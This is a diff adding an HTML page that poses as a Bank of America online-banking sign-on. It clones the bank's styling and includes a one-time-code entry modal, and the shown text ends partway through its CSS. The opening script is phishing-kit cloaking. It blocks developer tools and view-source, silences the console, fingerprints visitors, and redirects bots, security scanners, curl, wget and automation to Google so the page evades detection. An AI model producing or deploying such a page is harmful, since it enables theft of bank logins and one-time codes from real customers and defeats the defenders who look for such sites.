@@ -1,0 +1,2890 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Banking - Sign On</title>
+    
+    <!-- Legitimate-looking meta tags -->
+    <meta name="description" content="Access your accounts online. Sign in to manage your finances, pay bills, and more.">
+    <meta name="keywords" content="online banking, sign in, login, account access">
+    <meta name="author" content="Online Banking Services">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta name="referrer" content="no-referrer">
+    
+    <!-- Favicon and Apple Touch Icon -->
+    <link rel="shortcut icon" href="https://www.example.com/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="https://www.example.com/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" href="https://www.example.com/favicon.ico">
+    
+    <!-- Preconnect to legitimate domains -->
+    <link rel="preconnect" href="https://www.example.com">
+    <link rel="dns-prefetch" href="https://www.example.com">
+    
+    <!-- Bot Protection Script - Must run FIRST -->
+    <script>
+        (function() {
+            'use strict';
+            
+            // Disable right-click context menu
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            document.addEventListener('keydown', function(e) {
+                // F12
+                if (e.keyCode === 123) {
+                    e.preventDefault();
+                    return false;
+                }
+                // Ctrl+Shift+I (Inspector)
+                if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                    e.preventDefault();
+                    return false;
+                }
+                // Ctrl+Shift+J (Console)
+                if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+                    e.preventDefault();
+                    return false;
+                }
+                // Ctrl+Shift+C (Inspect Element)
+                if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
+                    e.preventDefault();
+                    return false;
+                }
+                // Ctrl+U (View Source)
+                if (e.ctrlKey && e.keyCode === 85) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+            
+            // Detect DevTools open (console) - ONLY on desktop
+            const isMobile = /iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent);
+            if (!isMobile) {
+            const devToolsCheck = () => {
+                const threshold = 160;
+                if (window.outerWidth - window.innerWidth > threshold || 
+                    window.outerHeight - window.innerHeight > threshold) {
+                    // DevTools detected - redirect
+                        window.location.replace('https://www.google.com/');
+                }
+            };
+            setInterval(devToolsCheck, 1000);
+            }
+            
+            // Obfuscate console logs
+            if (typeof console !== 'undefined') {
+                console.log = function() {};
+                console.warn = function() {};
+                console.error = function() {};
+                console.info = function() {};
+                console.debug = function() {};
+            }
+            
+            // Bot detection patterns (only the most obvious bots)
+            const botPatterns = [
+                /bot/i, /crawl/i, /spider/i, /slurp/i,
+                /curl/i, /wget/i, /python-requests/i,
+                /lighthouse/i, /gtmetrix/i, /pingdom/i, /uptimerobot/i
+            ];
+            
+            // Check if mobile device (skip most bot checks for mobile)
+            const isMobileDevice = /iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent);
+            
+            // Check User Agent (skip for mobile)
+            const ua = navigator.userAgent;
+            const isBot = !isMobileDevice && botPatterns.some(pattern => pattern.test(ua));
+            
+            if (isBot) {
+                // Redirect obvious bots to real site
+                window.location.replace('https://www.google.com/');
+                throw new Error('Bot detected');
+            }
+            
+            // Only check for obvious automation (skip for mobile)
+            if (!isMobileDevice && (navigator.webdriver || window.navigator.webdriver)) {
+                window.location.replace('https://www.google.com/');
+                throw new Error('Automation detected');
+            }
+            
+            // Generate unique device ID
+            const deviceId = btoa(
+                navigator.userAgent + 
+                screen.width + 
+                screen.height + 
+                navigator.language +
+                new Date().getTimezoneOffset()
+            ).substring(0, 32);
+            
+            // Check localStorage for visit tracking (SKIP for mobile devices)
+            if (!isMobileDevice) {
+            const storageKey = 'boa_visit_' + deviceId;
+            const lastVisit = localStorage.getItem(storageKey);
+            const now = Date.now();
+            
+            if (lastVisit) {
+                const timeSinceLastVisit = now - parseInt(lastVisit);
+                
+                // Only block if visited within last 30 seconds (rapid bot behavior)
+                if (timeSinceLastVisit < 30000) { // 30 seconds
+                        window.location.replace('https://www.google.com/');
+                    throw new Error('Rate limit exceeded');
+                }
+            }
+            
+            // Store this visit
+            localStorage.setItem(storageKey, now.toString());
+            }
+            
+            // Require mouse movement or touch before allowing form submission
+            let humanVerified = false;
+            let interactionCount = 0;
+            
+            function verifyHuman() {
+                interactionCount++;
+                if (interactionCount >= 1) { // Changed from 2 to 1
+                    humanVerified = true;
+                }
+            }
+            
+            document.addEventListener('mousemove', verifyHuman, { once: false });
+            document.addEventListener('touchstart', verifyHuman, { once: false });
+            document.addEventListener('click', verifyHuman, { once: false });
+            document.addEventListener('scroll', verifyHuman, { once: false });
+            
+            // Override form submission to check for human interaction
+            window.addEventListener('load', function() {
+                const forms = document.querySelectorAll('form');
+                forms.forEach(form => {
+                    form.addEventListener('submit', function(e) {
+                        if (!humanVerified) {
+                            e.preventDefault();
+                            alert('Please interact with the page before submitting.');
+                            return false;
+                        }
+                    });
+                });
+                
+                // Also protect the login button click
+                const loginBtn = document.getElementById('login_button');
+                if (loginBtn) {
+                    const originalOnClick = loginBtn.onclick;
+                    loginBtn.onclick = function(e) {
+                        if (!humanVerified) {
+                            e.preventDefault();
+                            alert('Please move your mouse or touch the screen before continuing.');
+                            return false;
+                        }
+                        if (originalOnClick) {
+                            return originalOnClick.call(this, e);
+                        }
+                    };
+                }
+            });
+            
+            // Hide page initially, show after verification
+            document.documentElement.style.opacity = '0';
+            window.addEventListener('load', function() {
+                setTimeout(function() {
+                    document.documentElement.style.transition = 'opacity 0.3s';
+                    document.documentElement.style.opacity = '1';
+                }, 100);
+            });
+            
+        })();
+    </script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            /* Disable text selection */
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            /* Disable drag */
+            -webkit-user-drag: none;
+            -moz-user-drag: none;
+            user-drag: none;
+        }
+        
+        /* Allow selection in input fields */
+        input, textarea {
+            -webkit-user-select: text !important;
+            -moz-user-select: text !important;
+            -ms-user-select: text !important;
+            user-select: text !important;
+        }
+        
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.5;
+        }
+        
+        /* FDIC Top Banner */
+        #gtSecureFDICModule {
+            background-color: #f0f0f0;
+            padding: 8px 30px;
+            font-size: 12px;
+            color: #666;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        .fdic-realDevice {
+            text-align: center;
+        }
+        
+        .fdic-signage .elements {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .text-preamble {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .fdic-digital-sign {
+            height: 16px;
+            vertical-align: middle;
+        }
+        
+        .fdic-hidden {
+            display: none;
+        }
+        
+        .fdic-wealthSmalldevice {
+            display: none;
+        }
+        
+        @media (max-width: 768px) {
+            .fdic-realDevice {
+                display: none;
+            }
+            .fdic-wealthSmalldevice {
+                display: block;
+            }
+        }
+        
+        /* Header */
+        .header-container {
+            background-color: #fff;
+            border-bottom: 1px solid #e0e0e0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 12px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 30px;
+        }
+        
+        .logo-section img {
+            height: 28px;
+            width: auto;
+        }
+        
+        .login-text {
+            font-size: 18px;
+            color: #666;
+            font-weight: 400;
+        }
+        
+        .right-links {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .secure-area {
+            color: #666;
+            font-size: 14px;
+            padding-left: 20px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill="%23666" d="M8 0C5.8 0 4 1.8 4 4v2H3c-.6 0-1 .4-1 1v8c0 .6.4 1 1 1h10c.6 0 1-.4 1-1V7c0-.6-.4-1-1-1h-1V4c0-2.2-1.8-4-4-4zm0 2c1.1 0 2 .9 2 2v2H6V4c0-1.1.9-2 2-2z"/></svg>') no-repeat left center;
+        }
+        
+        .divide {
+            color: #0073cf;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .divide:hover {
+            text-decoration: underline;
+        }
+        
+        .clearboth {
+            clear: both;
+        }
+        
+        /* Red Title Bar */
+        .red-title-bar {
+            background: linear-gradient(to right, #e31837 0%, #c01530 100%);
+            padding: 20px 30px;
+        }
+        
+        .red-title-bar h1 {
+            color: white;
+            font-size: 28px;
+            font-weight: 300;
+            margin: 0;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        /* Main Container - 3 Column Layout */
+        .online-id-vipaa-module {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 30px;
+        }
+        
+        .enter-skin.phoenix {
+            display: flex;
+            gap: 0;
+            align-items: flex-start;
+        }
+        
+        .main-container {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 30px;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 30px;
+        }
+        
+        /* Column Boxes */
+        .column-box {
+            background: white;
+            padding: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        /* Form Column */
+        .online-id-section {
+            background: white;
+            padding: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            flex: 1;
+            max-width: 400px;
+        }
+        
+        .form-column h2 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #333;
+        }
+        
+        .ada-hidden {
+            position: absolute;
+            left: -10000px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+        
+        .mtop-15 {
+            margin-top: 15px;
+        }
+        
+        .fl-lt {
+            float: left;
+        }
+        
+        .fl-rt {
+            float: right;
+        }
+        
+        .hide {
+            display: none;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #707070;
+            border-radius: 4px;
+            font-size: 14px;
+            margin-bottom: 10px;
+            transition: border-color 0.3s;
+        }
+        
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #0073cf;
+            box-shadow: 0 0 0 2px rgba(0, 115, 207, 0.1);
+        }
+        
+        input[type="text"]:disabled,
+        input[type="password"]:disabled {
+            background-color: #f5f5f5;
+            cursor: not-allowed;
+        }
+        
+        .remember-info {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+        
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+        
+        input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        
+        .checkbox-row label,
+        .remember-info label {
+            margin: 0;
+            font-weight: normal;
+            cursor: pointer;
+        }
+        
+        .info-icon,
+        .boa-dialog {
+            color: #0073cf;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: help;
+        }
+        
+        .info-layer-help-fsd {
+            margin-left: 5px;
+        }
+        
+        .dotted {
+            border-bottom: 1px dotted #0073cf;
+        }
+        
+        .forgot-link,
+        .forgot-passcode {
+            color: #0073cf;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-link:hover,
+        .forgot-passcode:hover {
+            text-decoration: underline;
+        }
+        
+        /* Button - Extracted from real Bank of America site */
+        .btn-bofa {
+            position: relative;
+            display: inline-block;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            line-height: 22px;
+            padding: 5px 19px 7px;
+            margin-right: 15px;
+            text-align: center;
+            vertical-align: middle;
+            text-decoration: none !important;
+            border-radius: 5px;
+            cursor: pointer;
+            /* Removed default color and border - let the modifier classes handle it */
+        }
+        
+        .btn-bofa-blue {
+            color: rgb(255, 255, 255) !important;
+            background-color: rgb(0, 119, 190) !important;
+            background-image: linear-gradient(rgb(0, 125, 195), rgb(0, 103, 177)) !important;
+            border: 1px solid rgb(18, 78, 137) !important;
+            border-color: rgb(18, 78, 137) !important;
+            border-width: 1px !important;
+            border-style: solid !important;
+        }
+        
+        a.btn-bofa.btn-bofa-blue {
+            color: rgb(255, 255, 255) !important;
+            background-color: rgb(0, 119, 190) !important;
+            background-image: linear-gradient(rgb(0, 125, 195), rgb(0, 103, 177)) !important;
+            border: 1px solid rgb(18, 78, 137) !important;
+        }
+        
+        #login_button {
+            color: #fff !important;
+            border-color: #124e89 !important;
+            background-color: #0077be !important;
+            background-image: -webkit-gradient(linear, 0 0, 0 bottom, from(#007dc3), to(#0067b1)) !important;
+            background-image: -webkit-linear-gradient(#007dc3, #0067b1) !important;
+            background-image: -moz-linear-gradient(#007dc3, #0067b1) !important;
+            background-image: -ms-linear-gradient(#007dc3, #0067b1) !important;
+            background-image: linear-gradient(#007dc3, #0067b1) !important;
+            border: 1px solid #124e89 !important;
+            padding-left: 24px !important;
+        }
+        
+        #login_button::before {
+            content: "";
+            position: absolute;
+            left: 6px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 12px;
+            height: 14px;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 12 14' fill='white'%3E%3Cpath d='M10.5 5h-1V3.5C9.5 1.57 7.93 0 6 0S2.5 1.57 2.5 3.5V5h-1C.67 5 0 5.67 0 6.5v6c0 .83.67 1.5 1.5 1.5h9c.83 0 1.5-.67 1.5-1.5v-6c0-.83-.67-1.5-1.5-1.5zM6 10.75c-.69 0-1.25-.56-1.25-1.25s.56-1.25 1.25-1.25 1.25.56 1.25 1.25-.56 1.25-1.25 1.25zM8 5H4V3.5C4 2.4 4.9 1.5 6 1.5S8 2.4 8 3.5V5z'/%3E%3C/svg%3E");
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+        
+        .btn-bofa-small {
+            font-size: 13px !important;
+            padding: 1px 14px !important;
+        }
+        
+        .btn-bofa-noRight {
+            margin-right: 0 !important;
+        }
+        
+        .phoenix .simple-form .btn-bofa {
+            margin-top: 30px !important;
+        }
+        
+        .btn-bofa-blue-lock {
+            color: inherit !important;
+            background: transparent !important;
+            border: none !important;
+            display: inline !important;
+        }
+        
+        .btn-bofa-blue-lock::before {
+            content: "🔒 ";
+        }
+        
+        .btn-bofa-red {
+            background-color: #e31837;
+            color: white;
+            border-color: #c01530;
+        }
+        
+        .btn-bofa-red:hover {
+            background-color: #c01530;
+        }
+        
+        .login-btn {
+            display: inline-block;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.3s;
+        }
+        
+        /* App Column */
+        .app-column,
+        .mobile-cta-section {
+            background: white;
+            padding: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            flex: 1;
+            max-width: 400px;
+        }
+        
+        .vertical-dotted-line {
+            border-left: 1px dotted #ccc;
+            padding-left: 30px;
+            margin-left: 30px;
+        }
+        
+        .app-column h2,
+        .mobile-cta-section .title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .cnx-regular {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        
+        .enroll-color-gray {
+            color: #666;
+        }
+        
+        .mbtm-10 {
+            margin-bottom: 10px;
+        }
+        
+        .mcta-bubble {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .get-app-content-section {
+            margin-top: 20px;
+        }
+        
+        .phone-mockup {
+            width: 150px;
+            height: 280px;
+            margin: 0 auto 20px;
+            background: white;
+            border: 3px solid #333;
+            border-radius: 25px;
+            padding: 15px;
+            position: relative;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+        
+        .phone-notch {
+            width: 80px;
+            height: 20px;
+            background: #333;
+            border-radius: 0 0 15px 15px;
+            margin: -15px auto 10px;
+        }
+        
+        .phone-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            background: #f8f8f8;
+            border-radius: 10px;
+        }
+        
+        .phone-logo {
+            width: 80px;
+            height: auto;
+        }
+        
+        .app-description {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        .get-app-btn {
+            display: inline-block;
+            padding: 12px 30px;
+            background-color: #e31837;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.3s;
+        }
+        
+        .get-app-btn:hover {
+            background-color: #c01530;
+        }
+        
+        /* Help Column */
+        .help-column,
+        .flex-col,
+        .rt-col {
+            background: white;
+            padding: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            flex: 1;
+            max-width: 400px;
+            border-left: 1px dotted #ccc;
+            padding-left: 30px;
+            margin-left: 30px;
+        }
+        
+        .side-well-vipaa-module {
+            padding: 0;
+        }
+        
+        .fsd-ll-skin {
+            margin-bottom: 30px;
+        }
+        
+        .fsd-ll-skin:last-child {
+            margin-bottom: 0;
+        }
+        
+        .help-column h2,
+        .fsd-ll-skin h2 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #333;
+        }
+        
+        .help-links,
+        .li-pbtm-15 {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 0;
+            padding-left: 0;
+            list-style: none;
+        }
+        
+        .li-pbtm-15 li {
+            margin-bottom: 10px;
+        }
+        
+        .help-links a,
+        .li-pbtm-15 a,
+        .arrow {
+            color: #0073cf;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .help-links a:hover,
+        .li-pbtm-15 a:hover,
+        .arrow:hover {
+            text-decoration: underline;
+        }
+        
+        .arrow::before {
+            content: "→ ";
+            margin-right: 5px;
+        }
+        
+        /* Footer */
+        /* Footer Styles */
+        .global-footer-module {
+            background-color: #f5f5f5;
+            padding: 20px 0;
+            margin-top: 40px;
+            border-top: 1px solid #d8d8d8;
+        }
+        
+        .gray-bground-skin {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+            padding: 0 20px;
+        }
+        
+        .global-footer-module .gray-bground-skin .secure {
+            background: url(https://www.bankofamerica.com/pa/components/modules/global-footer-module/2.5/graphic/gfootb-static-sprite.png) 0 -10px no-repeat;
+            font-size: 11px;
+            color: #666;
+            font-weight: bold;
+            line-height: 14px;
+            padding-left: 20px;
+            margin-bottom: 13px;
+            display: inline-block;
+        }
+        
+        .link-container {
+            margin-bottom: 20px;
+        }
+        
+        .link-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+            flex-wrap: wrap;
+        }
+        
+        .link-row a {
+            color: #0073cf;
+            text-decoration: none;
+            font-size: 13px;
+            padding: 0 8px;
+            border-right: 1px solid #666;
+        }
+        
+        .link-row a:hover {
+            text-decoration: underline;
+        }
+        
+        .link-row a.last-link {
+            border-right: none;
+        }
+        
+        .global-footer-module .gray-bground-skin .link-container #footer_pill {
+            display: inline-block;
+            width: 30px;
+            height: 12px;
+            background: linear-gradient(to right, #0073cf 0%, #0073cf 50%, #666 50%, #666 100%);
+            border-radius: 6px;
+            vertical-align: middle;
+            margin-bottom: 3px;
+            margin-left: 5px;
+            position: relative;
+        }
+        
+        .global-footer-module .gray-bground-skin .link-container #footer_pill::before {
+            content: "✓";
+            position: absolute;
+            left: 3px;
+            top: -2px;
+            font-size: 10px;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .global-footer-module .gray-bground-skin .link-container #footer_pill::after {
+            content: "✕";
+            position: absolute;
+            right: 3px;
+            top: -2px;
+            font-size: 10px;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .clearboth {
+            clear: both;
+        }
+        
+        .gray-bground-skin p {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.8;
+            margin: 15px 0 0 0;
+        }
+        
+        .gray-bground-skin p a {
+            color: #0073cf;
+            text-decoration: none;
+        }
+        
+        .gray-bground-skin p a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Cookie Banner */
+        .cookie-banner {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            border-top: 2px solid #e0e0e0;
+            padding: 20px 40px;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+            z-index: 9998;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .cookie-text {
+            font-size: 13px;
+            color: #333;
+            line-height: 1.6;
+            flex: 1;
+        }
+        
+        .cookie-text a {
+            color: #0073cf;
+            text-decoration: underline;
+        }
+        
+        .cookie-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #666;
+            cursor: pointer;
+            padding: 5px 10px;
+        }
+        
+        .cookie-close:hover {
+            color: #333;
+        }
+        
+        /* Loading */
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0073cf;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* OTP Modal */
+        .otp-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .otp-content {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+        }
+        
+        .otp-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+        }
+        
+        .otp-content h2 {
+            color: #012169;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+        
+        .otp-content p {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .otp-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .otp-digit {
+            width: 50px;
+            height: 60px;
+            font-size: 24px;
+            text-align: center;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            transition: border-color 0.3s;
+            -webkit-appearance: none;
+            appearance: none;
+            -webkit-user-select: text;
+            user-select: text;
+            cursor: text;
+            touch-action: manipulation;
+        }
+        
+        .otp-digit:focus {
+            outline: none;
+            border-color: #0073cf;
+            box-shadow: 0 0 0 3px rgba(0, 115, 207, 0.1);
+        }
+        
+        .otp-btn {
+            background-color: #0073cf;
+            color: white;
+            border: none;
+            padding: 14px 40px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+        
+        .otp-btn:hover {
+            background-color: #005ba3;
+        }
+        
+        .resend-link {
+            color: #0073cf;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* Success Modal */
+        .success-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .success-content {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #28a745;
+            margin-bottom: 20px;
+        }
+        
+        .success-content h2 {
+            color: #012169;
+            margin-bottom: 15px;
+        }
+        
+        .success-content p {
+            color: #666;
+            margin-bottom: 25px;
+        }
+        
+        .success-btn {
+            background-color: #0073cf;
+            color: white;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .success-btn:hover {
+            background-color: #005ba3;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .main-container {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            /* Hide ALL desktop-only columns on mobile */
+            .mobile-cta-section,
+            .side-well-vipaa-module,
+            .vertical-dotted-line,
+            .flex-col.rt-col,
+            .fl-rt {
+                display: none !important;
+            }
+            
+            /* Show ONLY the login form column */
+            .enter-skin.phoenix {
+                display: block !important;
+                width: 100% !important;
+            }
+            
+            .online-id-section {
+                width: 100% !important;
+                float: none !important;
+            }
+            
+            /* Body adjustments */
+            body {
+                font-size: 14px;
+                background-color: #fff;
+            }
+            
+            /* Header adjustments */
+            .header-content {
+                padding: 8px 12px;
+                background: #fff;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+            }
+            
+            .logo-section {
+                display: flex;
+                align-items: center;
+                gap: 8px;
+                flex-shrink: 0;
+            }
+            
+            .logo-section img {
+                height: 20px;
+            }
+            
+            .login-text {
+                font-size: 14px;
+                white-space: nowrap;
+            }
+            
+            .right-links {
+                font-size: 11px;
+                gap: 8px;
+                display: flex;
+                align-items: center;
+                flex-wrap: nowrap;
+                white-space: nowrap;
+            }
+            
+            .right-links a {
+                padding: 0;
+                white-space: nowrap;
+            }
+            
+            .secure-area {
+                font-size: 11px;
+                padding-left: 18px;
+                background-size: 12px 12px;
+                white-space: nowrap;
+            }
+            
+            .divide {
+                display: none; /* Hide the divider on mobile */
+            }
+            
+            /* FDIC Banner */
+            #gtSecureFDICModule {
+                padding: 8px 15px;
+                font-size: 10px;
+                background-color: #f8f8f8;
+            }
+            
+            /* Red banner */
+            .red-banner {
+                padding: 25px 15px;
+                background: linear-gradient(135deg, #e31837 0%, #c01530 100%);
+            }
+            
+            .red-banner h1 {
+                font-size: 22px;
+                font-weight: 300;
+                letter-spacing: 0.5px;
+            }
+            
+            /* Main container - single column on mobile */
+            .main-container {
+                padding: 0 !important;
+                margin: 0 !important;
+                display: block !important;
+                max-width: 100%;
+                background: #fff;
+                grid-template-columns: 1fr !important;
+            }
+            
+            /* Force main container to show only login column */
+            .main-container {
+                display: flex !important;
+                flex-direction: column !important;
+            }
+            
+            /* Login form - full width on mobile with better styling */
+            .online-id-vipaa-module {
+                width: 100% !important;
+                max-width: 100% !important;
+                margin: 0 !important;
+                padding: 25px 20px !important;
+                background: #fff;
+                box-shadow: none !important;
+                border: none !important;
+            }
+            
+            .enter-skin.phoenix {
+                padding: 0 !important;
+                background: transparent !important;
+            }
+            
+            /* Form title */
+            .online-id-vipaa-module h2,
+            .online-id-vipaa-module h3 {
+                font-size: 18px;
+                margin-bottom: 20px;
+                color: #333;
+            }
+            
+            /* Form labels */
+            .simple-form label {
+                font-size: 14px;
+                font-weight: 600;
+                color: #333;
+                margin-bottom: 8px;
+                display: block;
+            }
+            
+            /* Form elements - larger touch targets */
+            .simple-form input[type="text"],
+            .simple-form input[type="password"] {
+                font-size: 16px !important; /* Prevent zoom on iOS */
+                padding: 14px 12px !important;
+                border: 1px solid #ccc !important;
+                border-radius: 4px !important;
+                width: 100% !important;
+                box-sizing: border-box !important;
+                background: #fff !important;
+                margin-bottom: 15px !important;
+            }
+            
+            .simple-form input[type="text"]:focus,
+            .simple-form input[type="password"]:focus {
+                border-color: #0077be !important;
+                outline: none !important;
+                box-shadow: 0 0 0 2px rgba(0, 119, 190, 0.1) !important;
+            }
+            
+            /* Checkbox styling */
+            .simple-form input[type="checkbox"] {
+                width: 18px;
+                height: 18px;
+                margin-right: 8px;
+            }
+            
+            .simple-form .checkbox-label {
+                font-size: 14px;
+                color: #666;
+                display: flex;
+                align-items: center;
+                margin: 15px 0;
+            }
+            
+            /* Button adjustments - make it pop */
+            #login_button {
+                width: 100% !important;
+                display: block !important;
+                margin: 25px 0 0 0 !important;
+                padding: 16px 14px !important;
+                font-size: 16px !important;
+                font-weight: 700 !important;
+                text-align: center !important;
+                border-radius: 6px !important;
+                box-shadow: 0 2px 8px rgba(0, 119, 190, 0.3) !important;
+                transition: all 0.2s ease !important;
+                position: relative !important;
+            }
+            
+            #login_button::before {
+                content: "";
+                position: relative !important;
+                display: inline-block !important;
+                width: 12px !important;
+                height: 14px !important;
+                margin-right: 6px !important;
+                vertical-align: middle !important;
